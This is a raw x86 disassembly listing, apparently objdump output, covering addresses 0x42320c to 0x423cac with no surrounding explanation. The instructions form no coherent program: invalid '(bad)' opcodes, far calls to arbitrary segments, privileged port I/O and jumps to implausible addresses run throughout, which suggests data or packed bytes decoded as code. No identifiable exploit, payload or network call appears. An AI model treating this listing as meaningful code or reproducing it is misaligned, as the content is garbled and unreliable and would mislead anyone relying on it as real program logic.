  42320c:	or     al,0x83
  42320e:	mov    DWORD PTR [eax-0x76487f87],edx
  423214:	scas   al,BYTE PTR es:[edi]
  423215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423216:	sti    
  423217:	dec    edx
  423218:	jo     0x423267
  42321a:	lds    ecx,FWORD PTR [edi+0xcbf5062]
  423220:	shl    cl,0xe
  423223:	loop   0x4231b3
  423225:	shr    DWORD PTR [edx+edx*1],0xff
  423229:	cld    
  42322a:	(bad)  
  42322b:	adc    dh,BYTE PTR [ebp+ecx*4+0x479a7bb5]
  423232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423233:	sub    al,0xfc
  423235:	pop    ebx
  423236:	aaa    
  423237:	shl    DWORD PTR [esi+0x2d],cl
  42323a:	jbe    0x42326b
  42323c:	pop    ecx
  42323d:	and    al,0xf1
  42323f:	mov    ds:0xeb7a4b49,al
  423244:	int3   
  423245:	mov    ds:0x8144c830,eax
  42324a:	cmc    
  42324b:	mov    BYTE PTR [edi+0xc59f883],bh
  423251:	jb     0x423207
  423253:	fistp  WORD PTR [ebp+0x5b7c6fa0]
  423259:	push   ss
  42325a:	popa   
  42325b:	add    eax,0xdeb9d2f
  423260:	and    esi,0x3a7f881e
  423266:	ds sbb cl,BYTE PTR ds:[ecx]
  42326a:	call   0xf5d6:0x538c006e
  423271:	adc    DWORD PTR [edi-0x6e97a509],esi
  423277:	pop    ecx
  423278:	add    bh,BYTE PTR [edi-0x415fec9e]
  42327e:	cmp    BYTE PTR [edi-0x741ecc65],al
  423284:	retf   0x9e94
  423287:	xor    ecx,esp
  423289:	js     0x423215
  42328b:	jmp    0x5de3d88e
  423290:	cmp    DWORD PTR [eax+ebx*1+0x5c323279],0x0
  423298:	dec    edx
  423299:	scas   eax,DWORD PTR es:[edi]
  42329a:	inc    ecx
  42329b:	icebp  
  42329c:	ins    DWORD PTR es:[edi],dx
  42329d:	dec    edx
  42329e:	dec    edi
  42329f:	scas   al,BYTE PTR es:[edi]
  4232a0:	fldenv [ebp-0x10b6346a]
  4232a6:	jge    0x4232dd
  4232a8:	inc    ebx
  4232a9:	xor    BYTE PTR [ecx],0x87
  4232ac:	xchg   ebp,edi
  4232ae:	sub    BYTE PTR [ebx],bh
  4232b0:	int    0x55
  4232b2:	mov    edx,0xd9bc
	...
  423313:	add    BYTE PTR [eax],al
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	xor    al,0xa0
  423324:	mov    dh,0x86
  423326:	bound  esi,QWORD PTR [esi+0x1]
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [eax],ah
  42332f:	pusha  
  423330:	stos   DWORD PTR es:[edi],eax
  423331:	push   ds
  423332:	retf   0x4833
  423335:	jg     0x423345
  423337:	cmp    DWORD PTR [eax+0x7],eax
  42333a:	or     cl,BYTE PTR [esi+0x7b2b5597]
  423340:	lods   al,BYTE PTR ds:[esi]
  423341:	pop    ebx
  423342:	scas   eax,DWORD PTR es:[edi]
  423343:	ins    BYTE PTR es:[edi],dx
  423344:	shr    DWORD PTR [esp+esi*1-0x4bd6011e],1
  42334b:	fcom   DWORD PTR [edi+esi*1+0x3ea29887]
  423352:	add    DWORD PTR [eax],edx
  423354:	dec    esp
  423355:	shl    BYTE PTR [ebx],0x0
  423358:	rcr    DWORD PTR [ebp-0x13765809],1
  42335e:	jmp    0x939d68c6
  423363:	xchg   edx,eax
  423364:	push   ebp
  423365:	pop    esi
  423366:	cli    
  423367:	das    
  423368:	push   0x83ac60da
  42336d:	test   dh,ch
  42336f:	adc    BYTE PTR [edx],0xdf
  423372:	iret   
  423373:	leave  
  423374:	mov    ds:0xb4eac166,al
  423379:	lahf   
  42337a:	fist   DWORD PTR [edi+0x64]
  42337d:	lds    esp,FWORD PTR [ebp+edx*8+0x69116b1e]
  423384:	and    al,0x12
  423386:	ret    0x3f1c
  423389:	pushf  
  42338a:	sahf   
  42338b:	call   0x4824e00c
  423390:	mov    al,0x93
  423392:	test   BYTE PTR [edx+0x45],bh
  423395:	jmp    0x423411
  423397:	push   ebx
  423398:	dec    eax
  423399:	test   BYTE PTR ds:0xa369c5b4,cl
  42339f:	dec    DWORD PTR [ebp+0x75]
  4233a2:	leave  
  4233a3:	loopne 0x4233ea
  4233a5:	mov    ds:0x42111499,al
  4233aa:	fs push ebp
  4233ac:	and    ah,cl
  4233ae:	out    0x8,al
  4233b0:	sbb    BYTE PTR [ecx],0x3e
  4233b3:	int    0xae
  4233b5:	rcl    DWORD PTR [esi-0x50a7494f],0xee
  4233bc:	pop    edx
  4233bd:	mov    dl,0x37
  4233bf:	idiv   BYTE PTR [ebx]
  4233c1:	leave  
  4233c2:	xchg   edi,eax
  4233c3:	int    0x5a
  4233c5:	dec    esp
  4233c6:	gs aad 0xb6
  4233c9:	fisttp DWORD PTR [ecx-0x19]
  4233cc:	cmp    DWORD PTR [ebx-0x71a22996],eax
  4233d2:	jns    0x423426
  4233d4:	pop    edi
  4233d5:	test   BYTE PTR [ebp-0xb],al
  4233d8:	cmp    eax,0xc7445ec1
  4233dd:	cmp    eax,0x5fe6590e
  4233e2:	inc    edx
  4233e3:	pop    ss
  4233e4:	out    dx,ax
  4233e6:	pop    esp
  4233e7:	mov    ebp,0xa0e91f3d
  4233ec:	shl    DWORD PTR [esi-0x59e39384],1
  4233f2:	mov    ch,0x65
  4233f4:	push   ss
  4233f5:	mov    DWORD PTR [esi-0x51],0x76f2ec2
  4233fc:	lods   eax,DWORD PTR ds:[esi]
  4233fd:	fpatan 
  4233ff:	and    DWORD PTR es:[edi+0x4f],eax
  423403:	cld    
  423404:	cmp    bh,bl
  423406:	jnp    0x4233e6
  423408:	call   0xc17f:0x61b653fb
  42340f:	cwde   
  423410:	xchg   BYTE PTR [edx-0x6b],ah
  423413:	loop   0x423408
  423415:	or     al,BYTE PTR [edi-0x58]
  423418:	arpl   WORD PTR [eax-0x21f49b63],bp
  42341e:	pusha  
  42341f:	lock sbb esi,DWORD PTR [bx-0x5323]
  423425:	push   es
  423426:	call   0x6d8a:0x99ac91a5
  42342d:	ror    ah,1
  42342f:	js     0x423402
  423431:	sub    ch,bl
  423433:	sub    BYTE PTR [ebp+0x0],cl
	...
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	inc    bl
  4234a4:	and    al,0x23
  4234a6:	imul   esi,DWORD PTR [edi+0x1],0x10700
  4234ad:	add    BYTE PTR [edi+0x7c],cl
  4234b0:	stos   BYTE PTR es:[edi],al
  4234b1:	popa   
  4234b2:	fcom   QWORD PTR [edi+edx*2+0x7]
  4234b6:	xor    ebp,DWORD PTR fs:[ecx+0x14]
  4234ba:	mov    ebx,0x93fd4fb6
  4234bf:	push   eax
  4234c0:	sar    BYTE PTR [edi+0x63af7a0e],1
  4234c6:	xor    ch,BYTE PTR [eax]
  4234c8:	pop    esi
  4234c9:	adc    DWORD PTR [ebx+0x526ab025],0x77d5c11b
  4234d3:	add    edx,DWORD PTR [edi]
  4234d5:	adc    DWORD PTR [ebx+edx*2-0x49],ecx
  4234d9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4234db:	jmp    0x423513
  4234dd:	addr16 mov ebp,0xbe7319ea
  4234e3:	loop   0x4234a9
  4234e5:	cli    
  4234e6:	repz xor cl,ch
  4234e9:	daa    
  4234ea:	popa   
  4234eb:	inc    ecx
  4234ec:	in     al,dx
  4234ed:	(bad)
  4234f0:	pop    ecx
  4234f1:	or     eax,DWORD PTR [ebx]
  4234f3:	outs   dx,BYTE PTR ds:[esi]
  4234f4:	test   DWORD PTR [esi+0x61],ebp
  4234f7:	and    esp,DWORD PTR [ebp-0x59397f55]
  4234fd:	or     DWORD PTR [ebx],esi
  4234ff:	dec    esp
  423500:	sbb    bh,bl
  423502:	std    
  423503:	std    
  423504:	inc    edx
  423505:	jmp    0xc8de6462
  42350a:	imul   esp,DWORD PTR [edx+0x3d4ab064],0xffffffb9
  423511:	in     al,0xa0
  423513:	mov    cl,BYTE PTR [eax+ecx*4-0x44]
  423517:	les    ebx,FWORD PTR [ebp-0x253f031d]
  42351d:	mov    WORD PTR [ebx+0x4096662d],?
  423523:	imul   BYTE PTR [edi+0x37]
  423526:	sar    BYTE PTR [edx],1
  423528:	test   DWORD PTR [ecx+0x56b0d147],eax
  42352e:	lahf   
  42352f:	das    
  423530:	sahf   
  423531:	fimul  DWORD PTR [edi]
  423533:	sbb    esi,DWORD PTR [esi]
  423535:	and    DWORD PTR [ebp+0x4ac69f44],ebp
  42353b:	rcl    DWORD PTR [ebp-0x1],0x20
  42353f:	(bad)  
  423540:	int3   
  423541:	nop
  423542:	inc    esp
  423543:	sub    al,0xcb
  423545:	mul    BYTE PTR [edi+0x1a16a2]
  42354b:	mov    ds,edx
  42354d:	mov    al,ds:0x3be84309
  423552:	imul   edi,ebx,0xa675b31
  423558:	imul   ecx,DWORD PTR [ebx-0x7],0xf602a994
  42355f:	loop   0x423573
  423561:	sahf   
  423562:	push   edi
  423563:	sub    bl,bl
  423565:	aam    0xb2
  423567:	out    0xd,al
  423569:	push   ecx
  42356a:	xchg   ebx,eax
  42356b:	iret   
  42356c:	sub    esp,DWORD PTR [edx+0x3fec7eff]
  423572:	js     0x6121fd86
  423578:	fidivr DWORD PTR [edx-0x51fed5bb]
  42357e:	or     BYTE PTR [edx+0x3098d9eb],ch
  423584:	mul    bl
  423586:	rcr    ecx,1
  423588:	(bad)  
  423589:	loopne 0x42353f
  42358b:	in     al,0x81
  42358d:	inc    ebx
  42358e:	pop    eax
  42358f:	(bad)  
  423590:	jg     0x4235cf
  423592:	jmp    DWORD PTR [ecx]
  423594:	jno    0x4235c7
  423596:	push   edx
  423597:	neg    BYTE PTR [ebp+0x5b]
  42359a:	js     0x423609
  42359c:	std    
  42359d:	pop    edx
  42359e:	jae    0x4235d3
  4235a0:	inc    esp
  4235a1:	dec    edi
  4235a2:	pop    ebp
  4235a3:	sub    al,cl
  4235a5:	xchg   ch,ch
  4235a7:	xor    DWORD PTR [esi+0x7f333bc0],eax
  4235ad:	(bad)  
  4235ae:	shl    BYTE PTR [esi-0x4b],cl
  4235b1:	mov    ecx,DWORD PTR ds:0xeea2
	...
  423613:	add    BYTE PTR [eax],al
  423615:	add    BYTE PTR [eax+0x7f747c8f],al
  42361b:	test   DWORD PTR [eax+0x6a2d48ff],0xfff526da
  423625:	inc    esp
  423626:	jo     0x4236a0
  423628:	add    DWORD PTR [eax],eax
  42362a:	pop    es
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [edi],dl
  42362f:	stc    
  423630:	jo     0x4235ec
  423632:	(bad)  [eax+0x6]
  423635:	push   edi
  423636:	(bad)  
  423639:	out    0xad,eax
  42363b:	addr16 aam 0xc5
  42363e:	into   
  42363f:	rcl    DWORD PTR [edx+0x5806b7bf],0x26
  423646:	not    DWORD PTR [eax+0x7b]
  423649:	js     0x423674
  42364b:	jno    0x4236ac
  42364d:	cld    
  42364e:	mov    cs,edx
  423650:	xchg   ebx,eax
  423651:	jmp    FWORD PTR [ebp-0x57]
  423654:	pop    ebx
  423655:	push   edi
  423656:	fmul   QWORD PTR [eax+0x246f839f]
  42365c:	fwait
  42365d:	arpl   cx,cx
  42365f:	data16 test BYTE PTR [ecx+0x18f0a22b],ah
  423666:	add    ah,BYTE PTR [eax+edi*4-0x1a76d15f]
  42366d:	push   0x54a7af93
  423672:	jmp    0xff48d4c4
  423677:	pop    edx
  423678:	aaa    
  423679:	push   cs
  42367a:	and    eax,DWORD PTR ds:0x46c317b7
  423680:	mov    al,ds:0x66b93662
  423685:	cmp    esp,DWORD PTR [eax]
  423687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423688:	scas   al,BYTE PTR es:[edi]
  423689:	push   ecx
  42368a:	rcr    DWORD PTR [esi+0x32],1
  42368d:	adc    eax,0xf0a19e28
  423692:	cdq    
  423693:	jmp    0x42370b
  423695:	(bad)  
  423696:	outs   dx,DWORD PTR ds:[esi]
  423697:	std    
  423698:	gs cmp ecx,eax
  42369b:	call   0x6870:0x909734c5
  4236a2:	push   eax
  4236a3:	stc    
  4236a4:	dec    edi
  4236a5:	stos   BYTE PTR es:[edi],al
  4236a6:	jns    0x4236d5
  4236a8:	stos   BYTE PTR es:[edi],al
  4236a9:	loope  0x4236fd
  4236ab:	mov    ah,0x12
  4236ad:	stc    
  4236ae:	or     dl,BYTE PTR [ecx+eiz*8-0x1d]
  4236b2:	or     ebp,DWORD PTR [edx+0x458defac]
  4236b8:	sub    BYTE PTR ds:0x3ef0ba26,bl
  4236be:	jecxz  0x4236fe
  4236c0:	rcr    BYTE PTR [edi+0x4464bc92],cl
  4236c6:	(bad)
  4236c9:	jno    0x423709
  4236cb:	lds    eax,FWORD PTR [eax]
  4236cd:	rcl    DWORD PTR [ebp+0x2a1f81f1],0x26
  4236d4:	icebp  
  4236d5:	xor    bh,dl
  4236d7:	xchg   esp,eax
  4236d8:	mov    al,0x1
  4236da:	sar    BYTE PTR [esi-0x58223c71],1
  4236e0:	mov    ch,0x6d
  4236e2:	inc    ebp
  4236e3:	jo     0x4236c1
  4236e5:	mov    esi,0x70436409
  4236ea:	dec    ecx
  4236eb:	jle    0x4236ad
  4236ed:	stos   BYTE PTR es:[edi],al
  4236ee:	cmc    
  4236ef:	in     al,0xd8
  4236f1:	pop    ss
  4236f2:	dec    esi
  4236f3:	mov    eax,ds:0xd675eb85
  4236f8:	mov    bh,0x56
  4236fa:	shr    esi,1
  4236fc:	xchg   ebp,eax
  4236fd:	inc    edi
  4236fe:	das    
  4236ff:	inc    ebp
  423700:	data16 mov cl,0x65
  423703:	sub    al,0x48
  423705:	xchg   DWORD PTR [esi],edx
  423707:	adc    DWORD PTR [eax-0x16],ebp
  42370a:	mov    eax,0xf83a87f6
  42370f:	idiv   DWORD PTR [ebx]
  423711:	shl    dl,0xf9
  423714:	push   edx
  423715:	push   edx
  423716:	xchg   edx,eax
  423717:	int    0x91
  423719:	ret    
  42371a:	mov    eax,0x97bc332e
  42371f:	scas   al,BYTE PTR es:[edi]
  423720:	jl     0x4236dc
  423722:	or     esp,DWORD PTR [edi+0x669302ce]
  423728:	cmp    ah,BYTE PTR [edx-0x64fbbb1c]
  42372e:	fadd   DWORD PTR [ebp+0x22998de9]
  423734:	adc    BYTE PTR [eax],al
	...
  423796:	xor    al,0x23
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0xb0141111
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [esp+ebp*2+0x25],cl
  4237b1:	rcr    eax,cl
  4237b3:	adc    DWORD PTR [edi],esp
  4237b5:	xchg   al,ch
  4237b7:	imul   esi,edx,0x3a
  4237ba:	jl     0x423806
  4237bc:	(bad)  
  4237bd:	xor    DWORD PTR [esi],ecx
  4237bf:	outs   dx,BYTE PTR ds:[esi]
  4237c0:	jne    0x423771
  4237c2:	(bad)  
  4237c3:	jnp    0x423819
  4237c5:	into   
  4237c6:	call   0xf5b43521
  4237cb:	jae    0x42382d
  4237cd:	sub    dl,BYTE PTR [eax-0x45aea733]
  4237d3:	bound  edi,QWORD PTR [eax]
  4237d5:	sbb    al,0x1a
  4237d7:	mov    ds:0x50415e33,eax
  4237dc:	cmc    
  4237dd:	mov    ecx,DWORD PTR ds:0xeb09f9bc
  4237e3:	xor    DWORD PTR [edx-0x29],eax
  4237e6:	mov    al,0xd6
  4237e8:	mov    eax,ds:0xfebc87fe
  4237ed:	push   0xffffff9b
  4237ef:	(bad)  
  4237f1:	sahf   
  4237f2:	pop    esp
  4237f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237f4:	mov    WORD PTR [ebp-0x42359dd6],?
  4237fa:	push   edx
  4237fb:	fldenv [esi+ebp*1-0x14813fd6]
  423802:	lods   eax,DWORD PTR ds:[esi]
  423803:	jmp    0xd7dcdca2
  423808:	cmp    DWORD PTR [edi],esp
  42380a:	sub    al,0x91
  42380c:	adc    eax,0x724917d
  423811:	cmc    
  423812:	inc    esp
  423813:	sbb    edi,DWORD PTR [ebx-0x574b054]
  423819:	int    0xef
  42381b:	add    esi,DWORD PTR [ebx+0x1fb5e300]
  423821:	iret   
  423822:	xor    edx,edx
  423824:	pop    eax
  423825:	popa   
  423826:	inc    ebx
  423827:	(bad)  
  423828:	pop    eax
  423829:	push   ds
  42382a:	data16 stos BYTE PTR es:[edi],al
  42382c:	rcr    DWORD PTR [ebx],0x44
  42382f:	push   ss
  423830:	cmp    ebx,edi
  423832:	lock stos BYTE PTR es:[edi],al
  423834:	mul    DWORD PTR [eax-0x80]
  423837:	lods   eax,DWORD PTR ds:[esi]
  423838:	push   eax
  423839:	retf   
  42383a:	inc    esi
  42383b:	repnz call 0x653c:0xdb8aed8a
  423843:	cld    
  423844:	leave  
  423845:	pusha  
  423846:	pop    ecx
  423847:	push   esi
  423848:	xchg   esp,ecx
  42384a:	xor    dh,ch
  42384c:	(bad)  
  42384d:	out    dx,eax
  42384e:	pop    esp
  42384f:	and    cl,BYTE PTR [esi]
  423851:	inc    edx
  423852:	xchg   ecx,eax
  423853:	dec    ecx
  423854:	in     al,0xf8
  423856:	and    dl,dl
  423858:	push   es
  423859:	mov    ecx,0xdd81d3fd
  42385e:	in     eax,0x77
  423860:	jp     0x4237f3
  423862:	xor    DWORD PTR ds:0x74b7965c,0x822e75f6
  42386c:	cmp    esi,DWORD PTR [eax-0x21]
  42386f:	into   
  423870:	pop    ss
  423871:	jno    0x42389c
  423873:	xchg   ecx,eax
  423874:	pop    edx
  423875:	xchg   ecx,eax
  423876:	xor    al,BYTE PTR [edi-0x7c09d892]
  42387c:	push   edi
  42387d:	xor    DWORD PTR [edx-0x21fc8e0e],ecx
  423883:	mov    fs,WORD PTR [eax]
  423885:	clc    
  423886:	(bad)  
  423887:	popa   
  423888:	and    eax,0xcc15fd22
  42388d:	lea    esp,[edi-0x30]
  423890:	fld    QWORD PTR [eax+ecx*4]
  423893:	jecxz  0x4238d6
  423895:	inc    ecx
  423896:	xor    al,0x8e
  423898:	sub    bl,ah
  42389a:	xlat   BYTE PTR ds:[ebx]
  42389b:	addr16 in eax,0xd3
  42389e:	arpl   WORD PTR [edi+edi*4+0x4230a0e5],si
  4238a5:	in     al,0x5d
  4238a7:	or     BYTE PTR [ecx],cl
  4238a9:	xor    DWORD PTR [ebp+0x2d],0x3
  4238ad:	inc    ebp
  4238ae:	push   ebp
  4238af:	aas    
  4238b0:	inc    esi
  4238b1:	test   eax,0x35ac4e
	...
  423916:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    ebp,ecx
  423923:	dec    edi
  423924:	sbb    DWORD PTR [ebx],0x17a7e
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    BYTE PTR [ebx],al
  42392f:	cwde   
  423930:	and    BYTE PTR [ebx-0x2a073441],ch
  423936:	add    ebp,DWORD PTR [esi+esi*2+0x43]
  42393a:	pop    eax
  42393b:	test   al,0xda
  42393d:	sbb    eax,edi
  42393f:	ins    DWORD PTR es:[edi],dx
  423940:	stc    
  423941:	(bad)  
  423942:	hlt    
  423943:	imul   edi,DWORD PTR [eax-0x20],0x7c6447c2
  42394a:	xor    DWORD PTR [eax],edx
  42394c:	popa   
  42394d:	scas   al,BYTE PTR es:[edi]
  42394e:	sbb    bl,0x6b
  423951:	bnd jmp 0xadfafd7c
  423957:	mov    ebx,0x3f147872
  42395c:	call   0xf2bf5dfa
  423961:	hlt    
  423962:	ret    0x519f
  423965:	cdq    
  423966:	lea    ecx,[eax]
  423968:	adc    al,0xed
  42396a:	imul   edi,esi,0xa5a000ae
  423970:	popf   
  423971:	(bad)  
  423973:	lock sbb al,0x30
  423976:	iret   
  423977:	fdiv   DWORD PTR [ebx+0x18f69578]
  42397d:	pop    es
  42397e:	jg     0x423912
  423980:	inc    edi
  423981:	out    dx,eax
  423982:	inc    edi
  423983:	mov    ds:0x48cdd2b0,al
  423988:	sbb    bh,BYTE PTR [edx+0x15]
  42398b:	adc    ebx,ecx
  42398d:	jecxz  0x4239fe
  42398f:	les    esp,FWORD PTR [ecx-0x1264847c]
  423995:	cmp    ebp,eax
  423997:	push   eax
  423998:	add    bh,BYTE PTR [edx+ebp*2-0x6d357247]
  42399f:	push   edi
  4239a0:	daa    
  4239a1:	xor    eax,0x40bedc43
  4239a6:	jge    0x42396a
  4239a8:	inc    ecx
  4239a9:	shl    DWORD PTR [ecx],0xe6
  4239ac:	mov    edi,0xa09864b7
  4239b1:	lods   al,BYTE PTR ds:[esi]
  4239b2:	stos   DWORD PTR es:[edi],eax
  4239b3:	xchg   BYTE PTR [ebx],al
  4239b5:	sub    BYTE PTR [esi+0xf],ah
  4239b8:	inc    ebx
  4239b9:	inc    edx
  4239ba:	in     eax,dx
  4239bb:	fstp   st(6)
  4239bd:	sbb    eax,0xeb94ba31
  4239c2:	mov    eax,ds:0x814478f1
  4239c7:	mov    edx,0x76fd11fd
  4239cc:	in     al,0xc0
  4239ce:	ror    edi,cl
  4239d0:	icebp  
  4239d1:	push   edx
  4239d2:	push   ebp
  4239d3:	aaa    
  4239d4:	popf   
  4239d5:	lahf   
  4239d6:	ds jl  0x4239f0
  4239d9:	js     0x423970
  4239db:	mov    eax,0x3ef5a2c5
  4239e0:	shl    BYTE PTR [esi+0x69ead740],cl
  4239e6:	std    
  4239e7:	mov    BYTE PTR [ecx-0x2d],al
  4239ea:	pop    eax
  4239eb:	sahf   
  4239ec:	dec    edx
  4239ed:	xchg   DWORD PTR [edi+0x807e826],edi
  4239f3:	ss or  al,0x6e
  4239f6:	ja     0x423a52
  4239f8:	cmp    eax,0x5c2c6e48
  4239fd:	cmp    eax,0x5ce769d4
  423a02:	arpl   WORD PTR [eax],bx
  423a04:	or     DWORD PTR [esi],0x34949372
  423a0a:	es in  al,0x13
  423a0d:	or     eax,0x936478ed
  423a12:	jge    0x423a69
  423a14:	cmp    BYTE PTR [edi+0x4f],0x16
  423a18:	fwait
  423a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a1a:	adc    al,0x16
  423a1c:	pusha  
  423a1d:	push   0x7710160d
  423a22:	stos   BYTE PTR es:[edi],al
  423a23:	in     al,0x13
  423a25:	xlat   BYTE PTR ds:[ebx]
  423a26:	out    0x48,al
  423a28:	mov    esi,0xf230d1c3
  423a2d:	sub    DWORD PTR [esi],eax
  423a2f:	ss mov edi,0xf92ac509
	...
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	push   es
  423aa3:	in     al,0xd
  423aa5:	fld    DWORD PTR [ebp+0x700017b]
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    bl,bl
  423aaf:	(bad)  
  423ab1:	sbb    eax,0x5e5a5334
  423ab6:	and    eax,0x3c7639b1
  423abb:	jmp    0x112e2024
  423ac0:	dec    esi
  423ac1:	ins    DWORD PTR es:[edi],dx
  423ac2:	outs   dx,DWORD PTR ds:[esi]
  423ac3:	sbb    dh,BYTE PTR [edi]
  423ac5:	jmp    0x423b0b
  423ac7:	inc    edx
  423ac8:	cld    
  423ac9:	(bad)  
  423acb:	test   eax,0x1525dab0
  423ad0:	lea    esi,[eax+0x99aed75]
  423ad6:	mov    ch,0xa0
  423ad8:	fisubr WORD PTR [esi+0x49]
  423adc:	mov    esi,edx
  423ade:	push   0xa4a4cabc
  423ae3:	inc    ecx
  423ae4:	or     DWORD PTR [ecx-0x4a],esp
  423ae7:	test   DWORD PTR [edi-0x7e37298a],esi
  423aed:	and    al,0x6c
  423aef:	xchg   ebp,eax
  423af0:	sub    al,0x9
  423af2:	jae    0x423a92
  423af4:	sbb    BYTE PTR [esi],cl
  423af6:	inc    esp
  423af7:	jbe    0x423aa9
  423af9:	or     BYTE PTR [edi-0x56],dh
  423afc:	xor    al,0xf2
  423afe:	push   esi
  423aff:	mov    cl,0x1f
  423b01:	lahf   
  423b02:	adc    DWORD PTR [edi+0x179bd5c7],0x9d0ec98b
  423b0c:	stc    
  423b0d:	aam    0xbd
  423b0f:	imul   ebp,DWORD PTR [edx-0x62],0xffffffb8
  423b13:	cs mov ch,0x56
  423b16:	test   DWORD PTR [ecx+0x6e],edx
  423b19:	cld    
  423b1a:	cdq    
  423b1b:	inc    esi
  423b1c:	and    eax,0x2011eb03
  423b21:	ds adc al,0xa9
  423b24:	outs   dx,BYTE PTR ds:[esi]
  423b25:	xchg   ebp,eax
  423b26:	dec    ebp
  423b27:	es pop ebx
  423b29:	inc    eax
  423b2a:	jle    0x423aff
  423b2c:	popa   
  423b2d:	and    eax,DWORD PTR [esi]
  423b2f:	inc    dh
  423b31:	pop    edi
  423b32:	add    edx,DWORD PTR [esi+0xf]
  423b35:	js     0x423b92
  423b37:	pop    esi
  423b38:	mov    edx,0xc426b36c
  423b3d:	jmp    0x423b09
  423b3f:	addr16 adc al,0xbf
  423b42:	mov    al,ds:0x6c804490
  423b47:	xchg   esi,eax
  423b48:	push   esi
  423b49:	dec    ecx
  423b4a:	mov    al,BYTE PTR ds:0x91abf37b
  423b50:	in     eax,0xf
  423b52:	mov    esp,eax
  423b54:	mov    ah,0x6d
  423b56:	addr16 xor edi,ecx
  423b59:	mov    eax,DWORD PTR [eax+0x4625b1f2]
  423b5f:	out    0x75,al
  423b61:	(bad)  
  423b62:	jge    0x423bb4
  423b64:	ror    DWORD PTR [edx-0x7c],1
  423b67:	add    bl,BYTE PTR [ebx+ebx*1-0x7b7ebdec]
  423b6e:	in     eax,dx
  423b6f:	scas   al,BYTE PTR es:[edi]
  423b70:	scas   al,BYTE PTR es:[edi]
  423b71:	ins    DWORD PTR es:[edi],dx
  423b72:	jle    0x423b50
  423b74:	pop    ebp
  423b75:	pop    ss
  423b76:	jb     0x423b19
  423b78:	arpl   WORD PTR [ebx],sp
  423b7a:	jb     0x423b51
  423b7c:	popa   
  423b7d:	add    DWORD PTR [ebp+0x11],ebx
  423b80:	mov    ecx,0x7a28c56a
  423b85:	fisttp DWORD PTR [ebx-0x64]
  423b88:	jns    0x423bb1
  423b8a:	and    DWORD PTR [edx],ecx
  423b8c:	cmp    BYTE PTR [edx+0x6c765e9f],ah
  423b92:	push   esi
  423b93:	pop    ecx
  423b94:	das    
  423b95:	mov    dl,0x75
  423b97:	call   0xe183:0x18543e5b
  423b9e:	hlt    
  423b9f:	or     ebp,0xa8fcb929
  423ba5:	dec    edi
  423ba6:	retf   0xcc30
  423ba9:	or     eax,0x4045c62f
  423bae:	popa   
  423baf:	mov    esp,0x776dbb67
  423bb4:	aas    
	...
  423c15:	add    ch,bh
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	cli    
  423c23:	mov    eax,0x7c8ce688
  423c28:	add    DWORD PTR [eax],eax
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    dl,cl
  423c2f:	(bad)  
  423c30:	jp     0x423c04
  423c32:	lods   al,BYTE PTR fs:[esi]
  423c34:	cmp    DWORD PTR ds:0x7794eec1,0xffffffbd
  423c3b:	out    dx,eax
  423c3c:	js     0x423c59
  423c3e:	xchg   esi,eax
  423c3f:	mov    al,0xfa
  423c41:	jle    0x423c74
  423c43:	pop    ds
  423c44:	cmp    al,0x38
  423c46:	mov    ch,0x93
  423c48:	xchg   ebp,eax
  423c49:	jle    0x423c28
  423c4b:	gs sbb al,0x2
  423c4e:	dec    edx
  423c4f:	mov    eax,0x32747af3
  423c54:	repz mov esp,0xec332b6
  423c5a:	pop    esi
  423c5b:	pusha  
  423c5c:	(bad)  
  423c5d:	scas   al,BYTE PTR es:[edi]
  423c5e:	fcmovne st,st(5)
  423c60:	neg    esp
  423c62:	ror    DWORD PTR [ebp-0xf],cl
  423c65:	xchg   BYTE PTR [edx-0x57],bl
  423c68:	add    eax,0xaf768546
  423c6d:	lods   al,BYTE PTR ds:[esi]
  423c6e:	mov    ah,0xae
  423c70:	fadd   QWORD PTR [edx]
  423c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c73:	cmc    
  423c74:	das    
  423c75:	(bad)
  423c79:	jb     0x423c74
  423c7b:	lods   al,BYTE PTR ds:[esi]
  423c7c:	cdq    
  423c7d:	fisubr DWORD PTR [ebp-0x2c837955]
  423c83:	in     eax,dx
  423c84:	mov    al,ds:0xdd4c7e28
  423c89:	push   esi
  423c8a:	retf   0x809
  423c8d:	bound  eax,QWORD PTR [ecx-0x24211e83]
  423c93:	mov    ebp,0x128c94d
  423c98:	mov    dl,0x90
  423c9a:	adc    al,0x74
  423c9c:	test   BYTE PTR [ecx-0x23],0x76
  423ca0:	mov    ah,0x65
  423ca2:	cld    
  423ca3:	mov    bh,0xe7
  423ca5:	add    BYTE PTR [edi],ah
  423ca7:	ret    
  423ca8:	dec    esp
  423ca9:	aaa    
  423caa:	test   ebx,esp
  423cac:	and    bl,ch
